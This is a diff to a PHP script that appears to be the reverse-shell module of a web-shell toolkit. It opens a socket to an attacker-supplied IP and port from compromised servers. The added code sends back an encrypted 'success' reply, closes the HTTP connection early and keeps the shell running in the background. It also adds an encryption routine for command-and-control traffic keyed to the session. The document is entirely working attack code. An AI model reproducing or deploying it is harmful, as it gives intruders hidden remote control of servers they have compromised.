@@ -3,6 +3,20 @@
 @set_time_limit(0);
 function main($type,$ip,$port)
 {
+$result=array();
+ob_end_clean();
+
+            header("Connection: close");
+            ignore_user_abort();
+            ob_start();
+            $result["status"] = base64_encode("success");
+            $result["msg"] = base64_encode("success");
+            echo encrypt(json_encode($result), $_SESSION['k']);
+            $size = ob_get_length();
+            header("Content-Length: $size");
+
+            ob_end_flush();
+            flush();
  if ($type=="shell")
  {
  common($ip,$port);
@@ -129,4 +143,18 @@ function common($ip,$port)
       }
       @socket_close($s);
     }
+}
+function encrypt($data,$key)
+{
+	if(!extension_loaded('openssl'))
+    	{
+    		for($i=0;$i<strlen($data);$i++) {
+    			 $data[$i] = $data[$i]^$key[$i+1&15];
+    			}
+			return $data;
+    	}
+    else
+    	{
+    		return openssl_encrypt($data, "AES128", $key);
+    	}
 }
